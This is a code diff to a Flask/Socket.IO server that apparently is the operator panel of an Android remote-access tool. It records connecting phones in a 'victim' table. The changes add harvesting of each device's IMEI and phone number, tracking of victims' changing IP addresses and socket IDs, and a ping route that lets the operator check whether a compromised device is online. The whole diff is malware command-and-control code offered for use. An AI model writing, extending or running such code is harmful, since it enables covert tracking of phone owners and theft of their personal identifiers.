@@ -80,29 +80,46 @@ def value_changed(data):
         record = cur.fetchall()
         if record.__len__() == 0:
             cur.execute(
-                "INSERT INTO victim(model, deviceid, ipaddress, api, socketid) VALUES(?, ?, ?, ?, ?)",
+                "INSERT INTO victim(model, deviceid, ipaddress, api, imei, socketid, phone) VALUES(?, ?, ?, ?, ?, ?, ?)",
                 (
                     data['model'],
                     data['device_id'],
                     request.remote_addr,
                     data['api'],
-                    request.sid
+                    data['imei'],
+                    request.sid,
+                    data['phone']
                 )
             )
             con.commit()
         else:
-            if record[5] != request.sid:
+            sid = ""
+            with open('server_soc_id.txt', 'r') as f:
+                sid = f.read()
+            if record[3] != request.remote_addr:
+                cur.execute("UPDATE victim SET ipaddress= ? WHERE deviceid=?", (request.remote_addr, data['device_id']))
+                con.commit()
+                emit("update_victim_ip", {
+                        'deviceid' : data['device_id'],
+                        'ipaddress' : request.remote_addr
+                    }, to= sid
+                )
+            if record[6] != request.sid:
                 cur.execute("UPDATE victim SET socketid= ? WHERE deviceid=?", (request.sid, data['device_id']))
                 con.commit()
-        sid = ""
-        with open('server_soc_id.txt', 'r') as f:
-            sid = f.read()
+                emit("update_victim_socketid", {
+                        'deviceid' : data['device_id'],
+                        'socketid' : request.sid
+                    }, to= sid
+                )
         emit("new_device", {
                 'model': data['model'],
                 'deviceid' : data['device_id'],
                 'ipaddress' : request.remote_addr,
                 'api' : data['api'],
-                'socketid' : request.sid
+                'imei' : data['imei'],
+                'socketid' : request.sid,
+                'phone' : data['phone']
             }, to= sid
         )
         con.close()
@@ -111,6 +128,13 @@ def value_changed(data):
 
     # emit('android value', message, broadcast=True,)
 
+@socketio.on('pong')
+def pong(data):
+    sid = ""
+    with open('server_soc_id.txt', 'r') as f:
+        sid = f.read()
+    emit("pingback", {"deviceid" : data['device_id']}, to=sid)
+     
 
 @socketio.on('Slider value changed')
 def value_changed(message):
@@ -231,11 +255,26 @@ def log():
 def clients():
     if request.method == 'POST':
         if 'username' in session:
-            return jsonify({'htmlresponse': render_template("victim.html", data= [request.form['model'], request.form['device-id'], request.form['ip-address'], 'imei', request.form['api'], 'location'])}), 200
+            return jsonify({'htmlresponse': render_template("victim.html", data= [request.form['model'], request.form['device-id'], request.form['ip-address'], request.form['api'], request.form['imei'], request.form['socketid'], request.form['phone']])}), 200
         else:
             return redirect("/login", code=302)
     else:
         return render_template("error_page.html", code= ["400", "Bad Request"]), 400
+
+@app.route("/pingclient", methods=['POST'])
+def ping_client():
+    if request.method == 'POST':
+        if 'username' in session:
+            emit("ping", {
+                "data" : "syn",
+                "deviceid" : request.form['deviceid']
+                }, to=request.form['socketid']
+            )
+            return jsonify({"status" : "Device pinged. Waiting for response ..."}), 200
+        else:
+            return redirect("/login", code=302)
+    else:
+        return render_template("error_page.html", code= ["400", "Bad Request"]), 400  
 
 @app.route("/deleteclient", methods=['POST'])
 def delete_client():
